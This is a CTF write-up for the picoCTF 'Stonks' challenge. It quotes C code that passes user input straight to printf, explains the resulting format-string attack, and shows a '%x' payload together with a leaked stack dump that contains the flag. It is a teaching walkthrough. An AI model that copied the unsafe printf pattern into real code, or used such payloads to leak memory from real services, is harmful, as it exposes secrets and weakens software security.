# Stonks

Find CTF link [here](https://play.picoctf.org/practice/challenge/105?category=6&page=1).

For this CTF, we only have one C file to investigate. I assume that the fact that the source code itself is provided is a clue. This way, I can eliminate any options of buffer overflow, ROP, or return to LIBC. Let's take a look at the source code to find any smelly code.

In the function `int buy_stonks(Portfolio *p)` we can see the following code:
```c
.
.
.
.
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
    printf("Flag file not found. Contact an admin.\n");
    exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
.
.
.

// TODO: Figure out how to read token from file, for now just ask
printf(api_buf);
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```
They ask for input and then simply print it out. This reminded me of a casual conversation I had with a friend, who mentioned that the "printf" function can be vulnerable. 

After a quick Google search, I found that it is possible to leak variable values from the stack using a "format string attack." For example, printing `%x` will only print the first byte on the stack, and `%x%x` will print the first two bytes and so on.

But what variable is so important to leak? You guessed it right - it's `api_buf`. Now, let's build our exploit as a Python script.

1. Navigate to the vulnerable location.
2. Inject the malicious format string `%x%x%x%x%x%x%x%x%x%x`.
3. Parse the little-endian output and verify if it looks like a flag.

The first output is:
```
b'\x9a\x7f=\x08\x04\xb0\x00\x80H\x9c?\x7f\x9b\xd8\x0f\xff\xff\xff\xf1\x9a}\x16\x0f\x7f\xa9\x11\x0f\x7f\x9b\xdcp\x9a~\x18\x05\x9a\x7f;\t\xa7\xf3\xd0ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3\xff\xef\x00}\xf7\xfdj\xf8\xf7\xfa\x94@\xdcl\xfe\x00\x10\xf7\xe3\x8c\xe9\xf7\xfa\xa0\xc0\xf7\xf9\xb5\xc0\xf7\xf9\xb0\x00\xff\xef\x1d\xf8\xf7\xe2\x96\x8d\xf7\xf9\xb5\xc0\x80H\xec\xaf\xfe\xf1\xe0@\xf7\xfb\xdf\t\x80K\x00\x0f\x7f\x9b\x00\x0f\x7f\x9b\xe2\x0f\xfe\xf1\xe3\x8f\x7f\xc3\xd5\x0f\x7f\x9c\x89\r\xc6\xcf\xe0\x0f\x7f\x9b\x00\x08\x04\xb0\x00\xff\xef\x1e8\x80H\xc8i\xa7\xd1`'
```
You can notice the flag in Littel Endian in the memory dump. `ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3\xff\xef\x00}`
Converting to Big Endian is simple, you can check out my python code.

That's it, Thanks for reading.
